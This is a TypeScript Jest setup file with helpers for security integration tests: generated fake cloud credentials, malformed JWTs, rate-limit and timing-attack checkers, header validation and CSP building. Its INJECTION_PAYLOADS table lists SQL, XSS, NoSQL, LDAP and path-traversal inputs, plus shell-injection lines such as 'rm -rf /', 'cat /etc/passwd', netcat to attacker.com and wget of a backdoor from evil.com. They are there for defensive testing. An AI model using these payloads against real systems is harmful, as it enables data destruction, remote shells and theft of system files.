/**
 * Security Test Setup
 * Global setup and utilities for integration security tests
 */

import * as crypto from 'crypto';

// ============================================================================
// GLOBAL TEST SETUP
// ============================================================================

beforeAll(() => {
  // Set test environment
  process.env.NODE_ENV = 'test';
  process.env.SECURITY_TEST_MODE = 'true';

  // Disable external network calls in tests
  process.env.DISABLE_NETWORK = 'true';
});

afterAll(() => {
  // Cleanup
  delete process.env.SECURITY_TEST_MODE;
  delete process.env.DISABLE_NETWORK;
});

beforeEach(() => {
  // Reset security counters and state before each test
  jest.clearAllMocks();
});

// ============================================================================
// SECURITY TEST UTILITIES
// ============================================================================

/**
 * Generate test credentials for security testing
 */
export function generateTestCredentials(type: 'aws' | 'azure' | 'gcp') {
  switch (type) {
    case 'aws':
      return {
        accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
        secretAccessKey: crypto.randomBytes(32).toString('base64'),
        region: 'us-east-1'
      };
    case 'azure':
      return {
        tenantId: crypto.randomUUID(),
        clientId: crypto.randomUUID(),
        clientSecret: crypto.randomBytes(32).toString('base64'),
        subscriptionId: crypto.randomUUID()
      };
    case 'gcp':
      return {
        type: 'service_account',
        project_id: 'test-project-' + Date.now(),
        private_key_id: crypto.randomBytes(20).toString('hex'),
        private_key: generateRSAKeyPair().privateKey,
        client_email: `test-${Date.now()}@test-project.iam.gserviceaccount.com`,
        client_id: crypto.randomBytes(10).toString('hex')
      };
  }
}

/**
 * Generate RSA key pair for testing
 */
function generateRSAKeyPair() {
  const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 2048,
    publicKeyEncoding: {
      type: 'spki',
      format: 'pem'
    },
    privateKeyEncoding: {
      type: 'pkcs8',
      format: 'pem'
    }
  });

  return { publicKey, privateKey };
}

/**
 * Common injection payloads for testing
 */
export const INJECTION_PAYLOADS = {
  sql: [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT * FROM secrets--",
    "admin'--",
    "' OR 1=1--",
    "1' AND '1'='1"
  ],
  command: [
    '; rm -rf /',
    '&& cat /etc/passwd',
    '| nc attacker.com 4444',
    '`whoami`',
    '$(curl evil.com)',
    '\n rm -rf /',
    '; wget http://evil.com/backdoor.sh'
  ],
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg/onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '"><script>alert(String.fromCharCode(88,83,83))</script>'
  ],
  nosql: [
    { $ne: null },
    { $gt: '' },
    { $regex: '.*' },
    { $where: 'this.password == "admin"' }
  ],
  ldap: [
    'user*)(objectClass=*',
    'admin*)(|(password=*))',
    'user)(cn=*))((|'
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32',
    'folder/../../../secrets.txt',
    'data/../../admin/config.json',
    './../.env'
  ]
};

/**
 * Generate malicious JWT tokens for testing
 */
export function generateMaliciousJWT(type: 'expired' | 'tampered' | 'none-algorithm') {
  const header = { alg: 'RS256', typ: 'JWT' };
  const payload = {
    sub: 'user-123',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 3600
  };

  switch (type) {
    case 'expired':
      payload.exp = Math.floor(Date.now() / 1000) - 3600;
      break;
    case 'tampered':
      payload.sub = 'admin';
      break;
    case 'none-algorithm':
      header.alg = 'none' as any;
      break;
  }

  const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
  const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const signature = 'invalid-signature';

  return `${encodedHeader}.${encodedPayload}.${signature}`;
}

/**
 * Simulate rate limiting test scenarios
 */
export class RateLimitTester {
  private requests: Map<string, number[]> = new Map();

  recordRequest(userId: string): void {
    const timestamps = this.requests.get(userId) || [];
    timestamps.push(Date.now());
    this.requests.set(userId, timestamps);
  }

  getRequestCount(userId: string, windowMs: number = 60000): number {
    const timestamps = this.requests.get(userId) || [];
    const cutoff = Date.now() - windowMs;
    return timestamps.filter(t => t > cutoff).length;
  }

  exceedsLimit(userId: string, limit: number, windowMs: number = 60000): boolean {
    return this.getRequestCount(userId, windowMs) > limit;
  }

  reset(userId?: string): void {
    if (userId) {
      this.requests.delete(userId);
    } else {
      this.requests.clear();
    }
  }
}

/**
 * Create mock session for testing
 */
export function createMockSession(options: {
  userId?: string;
  token?: string;
  createdAt?: number;
  lastActivity?: number;
  ipAddress?: string;
  userAgent?: string;
} = {}) {
  return {
    userId: options.userId || 'user-' + crypto.randomBytes(8).toString('hex'),
    token: options.token || 'session-' + crypto.randomBytes(16).toString('hex'),
    createdAt: options.createdAt || Date.now(),
    lastActivity: options.lastActivity || Date.now(),
    ipAddress: options.ipAddress || '192.168.1.100',
    userAgent: options.userAgent || 'Mozilla/5.0 (Test)'
  };
}

/**
 * Validate security headers
 */
export function validateSecurityHeaders(headers: Record<string, string>): {
  valid: boolean;
  missing: string[];
  issues: string[];
} {
  const requiredHeaders = [
    'X-Content-Type-Options',
    'X-Frame-Options',
    'X-XSS-Protection',
    'Strict-Transport-Security',
    'Content-Security-Policy'
  ];

  const missing: string[] = [];
  const issues: string[] = [];

  for (const header of requiredHeaders) {
    if (!headers[header]) {
      missing.push(header);
    }
  }

  // Validate header values
  if (headers['X-Content-Type-Options'] !== 'nosniff') {
    issues.push('X-Content-Type-Options should be "nosniff"');
  }

  if (headers['X-Frame-Options'] !== 'DENY' && headers['X-Frame-Options'] !== 'SAMEORIGIN') {
    issues.push('X-Frame-Options should be "DENY" or "SAMEORIGIN"');
  }

  if (headers['Strict-Transport-Security'] && !headers['Strict-Transport-Security'].includes('max-age=')) {
    issues.push('Strict-Transport-Security should include max-age');
  }

  return {
    valid: missing.length === 0 && issues.length === 0,
    missing,
    issues
  };
}

/**
 * Generate entropy for security token testing
 */
export function calculateShannonEntropy(str: string): number {
  const frequencies: Record<string, number> = {};
  for (const char of str) {
    frequencies[char] = (frequencies[char] || 0) + 1;
  }

  let entropy = 0;
  const length = str.length;

  for (const freq of Object.values(frequencies)) {
    const probability = freq / length;
    entropy -= probability * Math.log2(probability);
  }

  return entropy;
}

/**
 * Test for timing attack vulnerabilities
 */
export async function testTimingAttack(
  fn: (input: string) => Promise<boolean>,
  correctValue: string,
  incorrectValue: string,
  iterations: number = 100
): Promise<{ vulnerable: boolean; timeDifference: number }> {
  const correctTimes: number[] = [];
  const incorrectTimes: number[] = [];

  for (let i = 0; i < iterations; i++) {
    // Test correct value
    const correctStart = process.hrtime.bigint();
    await fn(correctValue);
    const correctEnd = process.hrtime.bigint();
    correctTimes.push(Number(correctEnd - correctStart));

    // Test incorrect value
    const incorrectStart = process.hrtime.bigint();
    await fn(incorrectValue);
    const incorrectEnd = process.hrtime.bigint();
    incorrectTimes.push(Number(incorrectEnd - incorrectStart));
  }

  const avgCorrect = correctTimes.reduce((a, b) => a + b) / correctTimes.length;
  const avgIncorrect = incorrectTimes.reduce((a, b) => a + b) / incorrectTimes.length;
  const timeDifference = Math.abs(avgCorrect - avgIncorrect);

  // If time difference is significant (>10%), may be vulnerable
  const vulnerable = timeDifference > (avgCorrect * 0.1);

  return { vulnerable, timeDifference };
}

/**
 * Mock crypto operations for consistent testing
 */
export function mockCryptoSecure(): void {
  jest.spyOn(crypto, 'randomBytes').mockImplementation((size: number) => {
    return Buffer.from('0'.repeat(size));
  });
}

export function restoreCrypto(): void {
  jest.restoreAllMocks();
}

/**
 * Create test CSP policy
 */
export function createTestCSP(options: {
  strict?: boolean;
  allowInline?: boolean;
} = {}): string {
  const directives = [
    "default-src 'self'",
    options.allowInline ? "script-src 'self' 'unsafe-inline'" : "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "font-src 'self'",
    "connect-src 'self'",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'"
  ];

  if (options.strict) {
    directives.push("upgrade-insecure-requests");
    directives.push("block-all-mixed-content");
  }

  return directives.join('; ');
}

/**
 * Assertion helpers for security tests
 */
export const securityAssertions = {
  shouldRejectInjection: (fn: () => any, payload: string) => {
    expect(() => fn()).toThrow();
  },

  shouldSanitizeOutput: (input: string, output: string) => {
    expect(output).not.toContain('<script');
    expect(output).not.toContain('javascript:');
    expect(output).not.toContain('onerror=');
  },

  shouldEnforceRateLimit: (count: number, limit: number) => {
    expect(count).toBeLessThanOrEqual(limit);
  },

  shouldRequireAuthentication: (fn: () => any) => {
    expect(() => fn()).toThrow(/auth|credential|unauthorized/i);
  },

  shouldEnforceAuthorization: (fn: () => any) => {
    expect(() => fn()).toThrow(/permission|access.*denied|unauthorized/i);
  }
};

// Export test utilities
export default {
  generateTestCredentials,
  INJECTION_PAYLOADS,
  generateMaliciousJWT,
  RateLimitTester,
  createMockSession,
  validateSecurityHeaders,
  calculateShannonEntropy,
  testTimingAttack,
  mockCryptoSecure,
  restoreCrypto,
  createTestCSP,
  securityAssertions
};
